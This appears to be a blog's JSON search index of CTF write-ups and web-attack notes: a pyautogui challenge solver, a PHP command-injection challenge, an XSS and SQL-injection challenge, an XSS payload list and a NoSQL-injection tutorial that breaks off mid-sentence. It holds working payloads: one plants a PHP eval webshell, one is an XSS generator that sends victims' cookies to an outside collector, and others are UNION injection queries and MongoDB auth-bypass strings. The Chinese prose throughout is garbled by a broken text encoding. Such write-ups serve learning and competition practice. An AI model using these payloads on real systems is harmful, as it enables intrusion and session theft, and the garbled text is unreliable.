‡é”®ç›˜ï¼‰GitHubå®˜æ–¹æ–‡æ¡£ç¿»è¯‘\nPayautogui\rpayautoguiæ˜¯ä¸€ä¸ªPythonæ¨¡å—ï¼Œå¯ä»¥ä»¥ç¼–ç¨‹çš„æ–¹å¼æ§åˆ¶é”®é¼  ä½¿ç”¨è„šæœ¬\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 import pyautogui import time from pywinauto.application import Application print(\u0026#34;è„šæœ¬å°†åœ¨3ç§’åå¼€å§‹è¿è¡Œ...\u0026#34;) time.sleep(3) start_x, start_y, end_x, end_y = 900, 210, 2080, 1390 grid = [] key = [] grid.append(565) key.append(\u0026#39;9fc82e15d9de6ef2\u0026#39;) # åˆå§‹åŒ–ä¸€ä¸ªé›†åˆç”¨äºè®°å½•å·²è®¿é—®çš„ç½‘æ ¼ä½ç½® visited = set() visited.add(565) while len(grid): current_grid = grid.pop() current_key = key.pop() grid_x = start_x + 38 * (current_grid % 31) + 5 grid_y = start_y + 38 * (current_grid // 31) + 16 pyautogui.click(grid_x, grid_y) time.sleep(0.3) pyautogui.typewrite(current_key + \u0026#39;\\n\u0026#39;) time.sleep(0.3) try: app = Application(backend=\u0026#34;uia\u0026#34;).connect(title=\u0026#34;Right!\u0026#34;) dialog = app.window(title=\u0026#34;Right!\u0026#34;) static_text = dialog.child_window(control_type=\u0026#34;Text\u0026#34;) text = static_text.window_text() except Exception as e: print(f\u0026#34;æ— æ³•è¿æ¥åˆ°çª—å£: {e}\u0026#34;) continue pyautogui.typewrite(\u0026#39;\\n\u0026#39;) print(text) if \u0026#39;true\u0026#39; in text.lower(): break if \u0026#39;nothing\u0026#39; in text.lower(): continue t = text.split(\u0026#39;\\n\u0026#39;) print(t) # å‡è®¾æ¯ä¸€è¡Œéƒ½æœ‰è¶³å¤Ÿçš„é•¿åº¦ï¼Œæ·»åŠ å¼‚å¸¸å¤„ç†ä»¥é¿å…ç´¢å¼•é”™è¯¯ for i in range(min(4, len(t))): try: new_key = t[i][-17:-1] new_grid = int(t[i][7:10]) if new_grid not in visited: key.append(new_key) grid.append(new_grid) visited.add(new_grid) # æ ‡è®°ä¸ºå·²è®¿é—® except (ValueError, IndexError) as e: print(f\u0026#34;è§£æç¬¬ {i} è¡Œæ—¶å‡ºé”™: {e}\u0026#34;) continue print(\u0026#34;å½“å‰å·²è®¿é—®çš„ç½‘æ ¼æ•°é‡:\u0026#34;, len(visited)) print(\u0026#34;å¾…å¤„ç†çš„key:\u0026#34;, key) print(\u0026#34;å¾…å¤„ç†çš„grid:\u0026#34;, grid) å¾—åˆ°flag\n","date":"2025-06-01T10:28:21+08:00","image":"https://c.img.dasctf.com/LightPicture/2024/12/9d8f8773e21caf21.png","permalink":"https://Oight.github.io/p/dasctf/","title":"DASCTF"},{"content":"PHP RCE\rè®°å½•ä¸€é“å…³äºPHPå‡½æ•°æ¼æ´åˆ©ç”¨çš„é¢˜ç›®\r[é¢˜ç›®åœ¨è¿™é‡Œ](https://buuoj.cn/challenges#[BUUCTF 2018]Online Tool)\nåˆ›å»ºå®ä¾‹æ˜¾ç¤ºæºä»£ç å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;] = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } if(!isset($_GET[\u0026#39;host\u0026#39;])) { highlight_file(__FILE__); } else { $host = $_GET[\u0026#39;host\u0026#39;]; $host = escapeshellarg($host); $host = escapeshellcmd($host); $sandbox = md5(\u0026#34;glzjin\u0026#34;. $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]); echo \u0026#39;you are in sandbox \u0026#39;.$sandbox; @mkdir($sandbox); chdir($sandbox); echo system(\u0026#34;nmap -T5 -sT -Pn --host-timeout 2 -F \u0026#34;.$host); } payload:\n1 ?host=\u0026#39; \u0026lt;?php eval($_POST[\u0026#34;hack\u0026#34;]);?\u0026gt; -oG hack.php \u0026#39; è¿™ä¸ªpayloadçš„æ„æ€æ˜¯ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬çš„åŒæ—¶ï¼Œå°† nmap çš„æ‰«æç»“æœä¿å­˜ä¸º hack.php æ–‡ä»¶ä»¥å…èšå‰‘è¿æ¥æ—¶è¿”å›å†…å®¹ä¸ºç©ºã€‚ æœ€åèšå‰‘è¿æ¥ï¼Œåœ¨æ ¹ç›®å½•ä¸‹æ‰¾åˆ°flag\nåœ¨è¿™é“é¢˜ç›®ä¸­å…¶ä»–éœ€è¦æ³¨æ„çš„æ˜¯å…³äºè½¬ä¹‰ç¬¦çš„ç†è§£ï¼š\rä¸Šé¢æåˆ°escapeshellarg()å‡½æ•°ä¼šå°† å•å¼•å·è¿›è¡Œåˆ©ç”¨æˆ–è½¬ä¹‰ï¼Œç„¶åå†åœ¨ä¸¤è¾¹åŠ ä¸Šå¼•å·å¼•èµ·æ¥ã€‚ å…¶è½¬ä¹‰çš„æ–¹å¼å°±æ˜¯åœ¨å‰é¢åŠ ä¸Šä¸€ä¸ª\\ã€‚åŒæ ·çš„ï¼Œescapeshellcmd()ä¹Ÿä¼šåœ¨å¯¹ç‰¹æ®Šç¬¦å·è¿›è¡Œè½¬ä¹‰ï¼Œå³åœ¨å…¶å‰é¢åŠ ä¸Š\nå…¶ç›®çš„æ˜¯è®©ç¨‹åºè®¤ä¸ºå•å¼•å·ä»…ä»…ä½œä¸ºç¬¦å·å­˜åœ¨ï¼Œè€Œä¸ä½œä¸ºæŒ‡ä»¤çš„ä¸€éƒ¨åˆ†ã€‚\nä¾‹å¦‚ï¼š å¦‚æœä¼ å…¥\n1 It\u0026#39;s a dog. å°±å¯èƒ½å¯¼è‡´å¤šä½™çš„â€™ä½¿å¾—ç¨‹åºæŠ¥é”™ã€‚ è€Œä½¿ç”¨è½¬ä¹‰ç¬¦ä¹‹åï¼š\n1 2 It\\\u0026#39;s a dog. #ç­‰äº \u0026#34;It\u0026#39;s a dog.\u0026#34; è¿™æ—¶ä¼šä½œä¸ºä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ä¸²è¿›è¡Œåç»­æ“ä½œã€‚\nè®°ä¸€é“æ²¡æœ‰åšå‡ºæ¥çš„XSSæ”»å‡»é¢˜ç›®\rä¸Šä¸€å‘¨åœ¨åšé¢˜æ—¶äº†è§£åˆ°åˆ©ç”¨Cooikeå¯ä»¥è¿›è¡ŒXSSæ”»å‡»ï¼Œè¿™å‘¨å°±é‡åˆ°ä¸€é“XSSï¼Œå…·ä½“æ˜¯åˆ©ç”¨XSSé€šè¿‡æ›´æ”¹Cooikeè·å–ç®¡ç†å‘˜æƒé™æ¥å¾—åˆ°flag\né¢˜ç›®åœ¨è¿™é‡Œ [CISCN2019 åä¸œåŒ—èµ›åŒº Web2 1](https://buuoj.cn/challenges#[CISCN2019 åä¸œåŒ—èµ›åŒº]Web2)\nä¸€å¼€å§‹æ‰“å¼€å‘ç°æ˜¯ä¸€ä¸ªéå¸¸æ­£å¸¸çš„æ–‡ç« æ±‡æ€»é¡µé¢ï¼Œä¸€æ—¶é—´ä»¥ä¸ºèµ°é”™åœ°æ–¹äº†ï¼ˆï¼‰\nç„¶åæ¢ç´¢å‘ç°å­˜åœ¨æ³¨å†Œä»¥åŠç™»å½•çš„åŠŸèƒ½ã€‚æ³¨å†Œä¸ªadminï¼Œæ³¨å†ŒæˆåŠŸï¼Œè¯´æ˜è¿™é‡Œä¼¼ä¹å¯¹ç”¨æˆ·åæ²¡æœ‰é™åˆ¶ã€‚\nå‘ç°å­˜åœ¨ä¸Šä¼ æ–‡ç« å’Œåé¦ˆä¸¤ä¸ªåŠŸèƒ½ï¼Œç¿»çœ‹WPå¾—çŸ¥ï¼Œè¿™é‡Œçš„ä¸Šä¼ æ–‡ç« åŠŸèƒ½å­˜åœ¨XSSæ¼æ´ï¼Œå¯ä»¥åœ¨è¿™é‡Œä¸Šä¼ XSSæ”»å‡»ä»£ç ï¼Œç„¶åé€šè¿‡ä¸Šä¼ åé¦ˆå¾—åˆ°ç®¡ç†å‘˜çš„SESSIDï¼Œè¿›è¡ŒSQLæ³¨å…¥åå¾—åˆ°flag\næˆ‘ä»¬å¾—çŸ¥è¿™é‡Œå­˜åœ¨ä¸€ä¸ªadmin.php,è®¿é—®æç¤ºä¸æ˜¯ç®¡ç†å‘˜æ— æ³•æŸ¥çœ‹ï¼ˆæœç„¶ï¼‰\näºæ˜¯æˆ‘ä»¬å°è¯•è¿›è¡ŒXSSæ”»å‡»ã€‚å‘ç°è¿™é‡Œè¿˜å­˜åœ¨WAFï¼Œä¼šå°†â€™â€™(â€˜â€™è½¬ä¹‰æˆâ€ï¼ˆâ€\nä½¿ç”¨è¿™ä¸ªè„šæœ¬\n1 2 3 4 5 6 7 8 in_str = \u0026#34;(function(){window.location.href=\u0026#39;http://xss.buuoj.cn/index.php?do=api\u0026amp;id=xpqwIP\u0026amp;keepsession=0\u0026amp;location=\u0026#39;+escape((function(){try{return document.location.href}catch(e){return\u0026#39;\u0026#39;}})())+\u0026#39;\u0026amp;toplocation=\u0026#39;+escape((function(){try{return top.location.href}catch(e){return\u0026#39;\u0026#39;}})())+\u0026#39;\u0026amp;cookie=\u0026#39;+escape((function(){try{return document.cookie}catch(e){return\u0026#39;\u0026#39;}})())+\u0026#39;\u0026amp;opener=\u0026#39;+escape((function(){try{return(window.opener\u0026amp;\u0026amp;window.opener.location.href)?window.opener.location.href:\u0026#39;\u0026#39;}catch(e){return\u0026#39;\u0026#39;}})());})();\u0026#34; output = \u0026#34;\u0026#34; for c in in_str: output += \u0026#34;\u0026amp;#\u0026#34; + str(ord(c)) print(\u0026#34;\u0026lt;svg\u0026gt;\u0026lt;script\u0026gt;eval\u0026amp;#40\u0026amp;#34\u0026#34; + output + \u0026#34;\u0026amp;#34\u0026amp;#41\u0026lt;/script\u0026gt;\u0026#34;) ç”Ÿæˆpayloadåæäº¤ï¼Œå¾—åˆ°urlåè¿›åé¦ˆ\nè¾“å…¥å¾—åˆ°çš„urlï¼ˆé¢˜ç›®æç¤ºè¦æŠŠé¶æœºåŸŸåæ”¹ä¸ºwebï¼‰æ¥ä¸‹æ¥è§£å†³éªŒè¯ç é—®é¢˜ï¼Œé¢˜ç›®ä¸­ç»™å‡ºsubstr(md5($str), 0, 6) === â€œcfde39â€ï¼š è¿™æ˜¯ä¸€ä¸ªMD5å¼±æ¯”è¾ƒï¼Œä½¿ç”¨ä¸‹é¢è¿™ä¸ªè„šæœ¬æ¥ç”ŸæˆéªŒè¯ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 import hashlib import random import string target = \u0026#34;cfde39\u0026#34; while True: # ç”Ÿæˆä¸€ä¸ªéšæœºå­—ç¬¦ä¸² (4 ä¸ªå­—ç¬¦) s = \u0026#39;\u0026#39;.join(random.choices(string.ascii_letters + string.digits, k=8)) hash_value = hashlib.md5(s.encode()).hexdigest()[:6] if hash_value == target: print(f\u0026#34;Found: {s}\u0026#34;) break ç”±äºé¢˜ç›®ä¸­æä¾›çš„xss.buuoj.cnå·²ç»åœæ­¢æœåŠ¡äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜è¦è‡ªå·±æ­å»ºä¸€ä¸ªç”¨äºæ¥æ”¶åé¦ˆçš„å¹³å°\né¡¹ç›®åœ°å€ï¼šXSSæ•°æ®æ¥æ”¶å¹³å°ï¼ˆæ— SQLç‰ˆï¼‰\nä½¿ç”¨å°çš®é¢æ¿æ¥æ­å»ºè¿™ä¸ªå¹³å°ï¼Œå¯æƒœçš„æ˜¯æ­å»ºå¥½åæˆ‘çš„æ¨¡æ¿éƒ½ç¥å¥‡åœ°æ¶ˆå¤±äº†ï¼Œä¸€å¼€å§‹ä»¥ä¸ºæ˜¯Windows Defenderçš„é—®é¢˜ï¼ˆè™½ç„¶ç¡®å®ï¼‰ï¼Œä½†å…³æ‰ä¹‹åè¿˜æ˜¯æ²¡æœ‰jsæ¨¡æ¿ï¼Œå¯¼è‡´å¹³å°ä¸€ç›´æ²¡æ³•ç”¨ï¼Œåªèƒ½æ­¢æ­¥äºæ­¤äº†ã€‚\nå¦‚æœé¡ºåˆ©çš„è¯ï¼Œå¯ä»¥æˆªå–åˆ°ç®¡ç†å‘˜çš„SESSIDï¼Œä»è€ŒæˆåŠŸç™»å½•åˆ°admin.phpï¼Œç„¶åç”¨\n1 2 3 4 5 6 7 8 9 -2 union select 1,2,3# -2 union select 1,database(),user()# -2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;ciscn\u0026#39;# -2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;flag\u0026#39;# -2 union select 1,2,group_concat(flagg) from ciscn.flag# SQLè”åˆæŸ¥è¯¢å¾—åˆ°flag\nè¿™é‡Œè®°å½•ä¸€äº›å¸¸è§çš„XSSæ”»å‡»ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 plaintext (1)æ™®é€šçš„XSS JavaScriptæ³¨å…¥ \u0026lt;SCRIPT SRC=http://3w.org/XSS/xss.js\u0026gt;\u0026lt;/SCRIPT\u0026gt; (2)IMGæ ‡ç­¾XSSä½¿ç”¨JavaScriptå‘½ä»¤ \u0026lt;IMG SRC=http://3w.org/XSS/xss.js/\u0026gt; (3)IMGæ ‡ç­¾æ— åˆ†å·æ— å¼•å· \u0026lt;IMG SRC=javascript:alert(\u0026#39;XSS\u0026#39;)\u0026gt; (4)IMGæ ‡ç­¾å¤§å°å†™ä¸æ•æ„Ÿ \u0026lt;IMG SRC=JaVaScRiPt:alert(\u0026#39;XSS\u0026#39;)\u0026gt; (5)HTMLç¼–ç (å¿…é¡»æœ‰åˆ†å·) \u0026lt;IMG SRC=javascript:alert(\u0026#34;XSS\u0026#34;)\u0026gt; (6)ä¿®æ­£ç¼ºé™·IMGæ ‡ç­¾ \u0026lt;IMG \u0026#34;\u0026#34;\u0026#34;\u0026gt;\u0026lt;SCRIPT\u0026gt;alert(\u0026#34;XSS\u0026#34;)\u0026lt;/SCRIPT\u0026gt;\u0026#34;\u0026gt; (7)formCharCodeæ ‡ç­¾(è®¡ç®—å™¨) \u0026lt;IMG SRC=javascript:alert(String.fromCharCode(88,83,83))\u0026gt; (8)UTF-8çš„Unicodeç¼–ç (è®¡ç®—å™¨) \u0026lt;IMG SRC=jav..çœç•¥..S\u0026#39;)\u0026gt; (9)7ä½çš„UTF-8çš„Unicodeç¼–ç æ˜¯æ²¡æœ‰åˆ†å·çš„(è®¡ç®—å™¨) \u0026lt;IMG SRC=jav..çœç•¥..S\u0026#39;)\u0026gt; (10)åå…­è¿›åˆ¶ç¼–ç ä¹Ÿæ˜¯æ²¡æœ‰åˆ†å·(è®¡ç®—å™¨) \u0026lt;IMG SRC=\u0026amp;#x6A\u0026amp;#x61\u0026amp;#x76\u0026amp;#x61..çœç•¥..\u0026amp;#x58\u0026amp;#x53\u0026amp;#x53\u0026amp;#x27\u0026amp;#x29\u0026gt; (11)åµŒå…¥å¼æ ‡ç­¾,å°†Javascriptåˆ†å¼€ \u0026lt;IMG SRC=\u0026#34;jav ascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; (12)åµŒå…¥å¼ç¼–ç æ ‡ç­¾,å°†Javascriptåˆ†å¼€ \u0026lt;IMG SRC=\u0026#34;jav ascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; (13)åµŒå…¥å¼æ¢è¡Œç¬¦ \u0026lt;IMG SRC=\u0026#34;jav ascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; (14)åµŒå…¥å¼å›è½¦ \u0026lt;IMG SRC=\u0026#34;jav ascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; (15)åµŒå…¥å¼å¤šè¡Œæ³¨å…¥JavaScript,è¿™æ˜¯XSSæç«¯çš„ä¾‹å­ \u0026lt;IMG SRC=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34;\u0026gt; (16)è§£å†³é™åˆ¶å­—ç¬¦(è¦æ±‚åŒé¡µé¢) \u0026lt;script\u0026gt;z=\u0026#39;document.\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;write(\u0026#34;\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;\u0026lt;script\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39; src=ht\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;tp://ww\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;w.shell\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;.net/1.\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;js\u0026gt;\u0026lt;/sc\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;z=z+\u0026#39;ript\u0026gt;\u0026#34;)\u0026#39;\u0026lt;/script\u0026gt;\u0026lt;script\u0026gt;eval_r(z)\u0026lt;/script\u0026gt; (17)ç©ºå­—ç¬¦12-7-1 T00LS - Powered by Discuz! Board https://www.a.com/viewthread.php?action=printable\u0026amp;tid=15267 2/6perl -e \u0026#39;print \u0026#34;\u0026lt;IMG SRC=java\\0script:alert(\\\u0026#34;XSS\\\u0026#34;)\u0026gt;\u0026#34;;\u0026#39; \u0026gt; out (18)ç©ºå­—ç¬¦2,ç©ºå­—ç¬¦åœ¨å›½å†…åŸºæœ¬æ²¡æ•ˆæœ.å› ä¸ºæ²¡æœ‰åœ°æ–¹å¯ä»¥åˆ©ç”¨ perl -e \u0026#39;print \u0026#34;\u0026lt;SCR\\0IPT\u0026gt;alert(\\\u0026#34;XSS\\\u0026#34;)\u0026lt;/SCR\\0IPT\u0026gt;\u0026#34;;\u0026#39; \u0026gt; out (19)Spaceså’Œmetaå‰çš„IMGæ ‡ç­¾ \u0026lt;IMG SRC=\u0026#34; javascript:alert(\u0026#39;XSS\u0026#39;);\u0026#34;\u0026gt; (20)Non-alpha-non-digit XSS \u0026lt;SCRIPT/XSS SRC=\u0026#34;http://3w.org/XSS/xss.js\u0026#34;\u0026gt;\u0026lt;/SCRIPT\u0026gt; (21)Non-alpha-non-digit XSS to 2 \u0026lt;BODY onload!#$%\u0026amp;()*~+-_.,:;?@[/|\\]^`=alert(\u0026#34;XSS\u0026#34;)\u0026gt; (22)Non-alpha-non-digit XSS to 3 \u0026lt;SCRIPT/SRC=\u0026#34;http://3w.org/XSS/xss.js\u0026#34;\u0026gt;\u0026lt;/SCRIPT\u0026gt; (23)åŒå¼€æ‹¬å· \u0026lt;\u0026lt;SCRIPT\u0026gt;alert(\u0026#34;XSS\u0026#34;);//\u0026lt;\u0026lt;/SCRIPT\u0026gt; (24)æ— ç»“æŸè„šæœ¬æ ‡è®°(ä»…ç«ç‹ç­‰æµè§ˆå™¨) \u0026lt;SCRIPT SRC=http://3w.org/XSS/xss.js?\u0026lt;B\u0026gt; (25)æ— ç»“æŸè„šæœ¬æ ‡è®°2 \u0026lt;SCRIPT SRC=//3w.org/XSS/xss.js\u0026gt; (26)åŠå¼€çš„HTML/JavaScript XSS \u0026lt;IMG SRC=\u0026#34;javascript:alert(\u0026#39;XSS\u0026#39;)\u0026#34; (27)åŒå¼€è§’æ‹¬å· \u0026lt;iframe src=http://3w.org/XSS.html \u0026lt; (28)æ— å•å¼•å· åŒå¼•å· åˆ†å· \u0026lt;SCRIPT\u0026gt;a=/XSS/alert(a.source)\u0026lt;/SCRIPT\u0026gt; (29)æ¢ç è¿‡æ»¤çš„JavaScript \\\u0026#34;;alert(\u0026#39;XSS\u0026#39;);// (30)ç»“æŸTitleæ ‡ç­¾ \u0026lt;/TITLE\u0026gt;\u0026lt;SCRIPT\u0026gt;alert(\u0026#34;XSS\u0026#34;);\u0026lt;/SCRIPT\u0026gt; æ›´å¤šXSSæ”»å‡»ä»£ç \né¡ºä¾¿è´´ä¸Šå‡ ç¯‡å‚è€ƒçš„WP\nWP1\nWP2\nWP3\nWP4\nWP5\nXSSæ•°æ®æ¥æ”¶å¹³å°é…ç½®æ•™ç¨‹\n","date":"2025-06-01T10:28:06+08:00","permalink":"https://Oight.github.io/p/rcexss/","title":"RCEï¼ŒXSS"},{"content":" NoSQLæ³¨å…¥\ræ„å¤–åœ¨å­¦ä¹ å†…ç½‘æ¸—é€é€”ä¸­æ¥è§¦åˆ°äº†NoSQLæ³¨å…¥ï¼Œå‘ç°çŸ¥è¯†åº“é‡Œä¹Ÿæ²¡æœ‰ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œè®°å½•ä¸€ä¸‹\rä»€ä¹ˆæ˜¯NoSQLï¼Ÿ\rNoSQL å³ Not Only SQLï¼Œæ„å³ â€œä¸ä»…ä»…æ˜¯SQLâ€ã€‚NoSQL æ˜¯ä¸€é¡¹å…¨æ–°çš„æ•°æ®åº“é©å‘½æ€§è¿åŠ¨ï¼Œæ—©æœŸå°±æœ‰äººæå‡ºï¼Œå‘å±•è‡³ 2009 å¹´è¶‹åŠ¿è¶Šå‘é«˜æ¶¨ã€‚NoSQLçš„æ‹¥æŠ¤è€…ä»¬æå€¡è¿ç”¨éå…³ç³»å‹çš„æ•°æ®å­˜å‚¨ï¼Œç›¸å¯¹äºé“ºå¤©ç›–åœ°çš„å…³ç³»å‹æ•°æ®åº“è¿ç”¨ï¼Œè¿™ä¸€æ¦‚å¿µæ— ç–‘æ˜¯ä¸€ç§å…¨æ–°çš„æ€ç»´çš„æ³¨å…¥ã€‚\nå¤§å¤šæ•°é‡åˆ°çš„NoSQLæ³¨å…¥ï¼Œå…¶é‡‡ç”¨çš„æ•°æ®åº“éƒ½æ˜¯MongoDBã€‚\nè¯»è¿™é‡Œè¯¦ç»†äº†è§£MongoDB\nNoSQL æ³¨å…¥çš„åˆ†ç±»\ræœ‰ä¸¤ç§ NoSQL æ³¨å…¥åˆ†ç±»çš„æ–¹å¼ï¼š\rç¬¬ä¸€ç§æ˜¯æŒ‰ç…§è¯­è¨€çš„åˆ†ç±»ï¼Œå¯ä»¥åˆ†ä¸ºï¼šPHP æ•°ç»„æ³¨å…¥ï¼ŒJavaScript æ³¨å…¥å’Œ Mongo Shell æ‹¼æ¥æ³¨å…¥ç­‰ç­‰ã€‚\nç¬¬äºŒç§æ˜¯æŒ‰ç…§æ”»å‡»æœºåˆ¶åˆ†ç±»ï¼Œå¯ä»¥åˆ†ä¸ºï¼šé‡è¨€å¼æ³¨å…¥ï¼Œè”åˆæŸ¥è¯¢æ³¨å…¥ï¼ŒJavaScript æ³¨å…¥ã€ç›²æ³¨ç­‰ï¼Œè¿™ç§åˆ†ç±»æ–¹å¼å¾ˆåƒä¼ ç»Ÿ SQL æ³¨å…¥çš„åˆ†ç±»æ–¹å¼ã€‚\n1 é‡è¨€å¼æ³¨å…¥ åˆç§°ä¸ºæ°¸çœŸå¼ï¼Œæ­¤ç±»æ”»å‡»æ˜¯åœ¨æ¡ä»¶è¯­å¥ä¸­æ³¨å…¥ä»£ç ï¼Œä½¿ç”Ÿæˆçš„è¡¨è¾¾å¼åˆ¤å®šç»“æœæ°¸è¿œä¸ºçœŸï¼Œä»è€Œç»•è¿‡è®¤è¯æˆ–è®¿é—®æœºåˆ¶ã€‚\n1 è”åˆæŸ¥è¯¢æ³¨å…¥ è”åˆæŸ¥è¯¢æ˜¯ä¸€ç§ä¼—æ‰€å‘¨çŸ¥çš„ SQL æ³¨å…¥æŠ€æœ¯ï¼Œæ”»å‡»è€…åˆ©ç”¨ä¸€ä¸ªè„†å¼±çš„å‚æ•°å»æ”¹å˜ç»™å®šæŸ¥è¯¢è¿”å›çš„æ•°æ®é›†ã€‚è”åˆæŸ¥è¯¢æœ€å¸¸ç”¨çš„ç”¨æ³•æ˜¯ç»•è¿‡è®¤è¯é¡µé¢è·å–æ•°æ®ã€‚\n1 JavaScript æ³¨å…¥ MongoDB Server æ”¯æŒ JavaScriptï¼Œè¿™ä½¿å¾—åœ¨æ•°æ®å¼•æ“è¿›è¡Œå¤æ‚äº‹åŠ¡å’ŒæŸ¥è¯¢æˆä¸ºå¯èƒ½ï¼Œä½†æ˜¯ä¼ é€’ä¸å¹²å‡€çš„ç”¨æˆ·è¾“å…¥åˆ°è¿™äº›æŸ¥è¯¢ä¸­å¯ä»¥æ³¨å…¥ä»»æ„çš„ JavaScript ä»£ç ï¼Œå¯¼è‡´éæ³•çš„æ•°æ®è·å–æˆ–ç¯¡æ”¹ã€‚\n1 ç›²æ³¨ å½“é¡µé¢æ²¡æœ‰å›æ˜¾æ—¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ $regex æ­£åˆ™è¡¨è¾¾å¼æ¥è¾¾åˆ°å’Œä¼ ç»Ÿ SQL æ³¨å…¥ä¸­ substr() å‡½æ•°ç›¸åŒçš„åŠŸèƒ½ï¼Œè€Œä¸” NoSQL ç”¨åˆ°çš„åŸºæœ¬ä¸Šéƒ½æ˜¯å¸ƒå°”ç›²æ³¨ã€‚\nå¸¸è§çš„NoSQLä¸ºPHPä¸­çš„NoSQLå’ŒNode.jsä¸­çš„NoSQL\nPHP ä¸­çš„NoSQLæ³¨å…¥\ré‡è¨€å¼æ³¨å…¥ï¼š\né‡è¨€å¼æ³¨å…¥é€šå¸¸ä¹Ÿæ˜¯åˆ¤æ–­æ˜¯å¦ä¸ºNoSQLçš„ç¬¬ä¸€æ­¥ã€‚ æˆ‘ä»¬éœ€è¦ç”¨$neå…³é”®å­—æ„é€ æ°¸çœŸæ¡ä»¶æ¥å®ŒæˆNoSQLæ³¨å…¥\n1 username[$ne]=1\u0026amp;password[$ne]=1 æœ€åå¦‚æœæ•°æ®åº“æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤çš„è¯ï¼Œè¿™é‡Œå°±ä¼šè¾“å‡ºæ‰€æœ‰çš„ç”¨æˆ·åå’Œç”¨æˆ·å¯†ç  è¿™é‡Œçš„åŸç†æ˜¯ï¼Œ$neå…³é”®å­—åœ¨MongoDBæŸ¥è¯¢è¯­å¥ä¸­æ„æ€æ˜¯ä¸ç­‰äºï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ä¸Šä¼ äº†ä¸€ä¸ªæ°¸çœŸæ¡ä»¶ï¼Œä½¿å¾—ç™»é™†æˆåŠŸï¼Œä½†æ˜¯æœåŠ¡ç«¯æŸ¥ä¸åˆ°usernameæ˜¯1ï¼Œpasswordä¹Ÿæ˜¯1çš„è´¦æˆ·ï¼Œåªèƒ½è¾“å‡ºæ‰€æœ‰çš„è´¦æˆ·\næ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„payloadï¼š\n1 2 3 username[$ne]=\u0026amp;password[$ne]= username[$gt]=\u0026amp;password[$gt]= username[$gte]=\u0026amp;password[$gte]= JavaScriptæ³¨å…¥ï¼š\nMongoDB Server æ˜¯æ”¯æŒ JavaScript çš„ï¼Œå¯ä»¥ä½¿ç”¨ JavaScript è¿›è¡Œä¸€äº›å¤æ‚äº‹åŠ¡å’ŒæŸ¥è¯¢ï¼Œä¹Ÿå…è®¸åœ¨æŸ¥è¯¢çš„æ—¶å€™æ‰§è¡Œ JavaScript ä»£ç ã€‚ä½†æ˜¯å¦‚æœä¼ é€’ä¸å¹²å‡€çš„ç”¨æˆ·è¾“å…¥åˆ°è¿™äº›æŸ¥è¯¢ä¸­ï¼Œåˆ™å¯èƒ½ä¼šæ³¨å…¥ä»»æ„çš„ JavaScript ä»£ç ï¼Œå¯¼è‡´éæ³•çš„æ•°æ®è·å–æˆ–ç¯¡æ”¹ã€‚\nè¦æƒ³ä½¿ç”¨JSæ³¨å…¥ï¼Œæˆ‘ä»¬éœ€è¦äº†è§£ä¸€ä¸‹$whereæ“ä½œç¬¦ã€‚\nåœ¨MongoDBä¸­ï¼Œå¯ä»¥é€šè¿‡$whereæ“ä½œç¬¦ç›´æ¥æ‰§è¡ŒJavaScriptä»£ç å¦‚ä¸‹å®ä¾‹ï¼š\ndb.users.find({ $where: â€œfunction(){return(this.username == â€˜whoamiâ€™)}â€ }) { â€œ_idâ€ : ObjectId(â€œ60fa9c80257f18542b68c4b9â€), â€œusernameâ€ : â€œwhoamiâ€, â€œpasswordâ€ : â€œ657260â€ }\nç”±äºä½¿ç”¨äº† $where å…³é”®å­—ï¼Œå…¶åé¢çš„ JavaScript å°†ä¼šè¢«æ‰§è¡Œå¹¶è¿”å› â€œwhoamiâ€ï¼Œç„¶åå°†æŸ¥è¯¢å‡º username ä¸º whoami çš„æ•°æ®ã€‚\næŸäº›æ˜“å—æ”»å‡»çš„ PHP åº”ç”¨ç¨‹åºåœ¨æ„å»º MongoDB 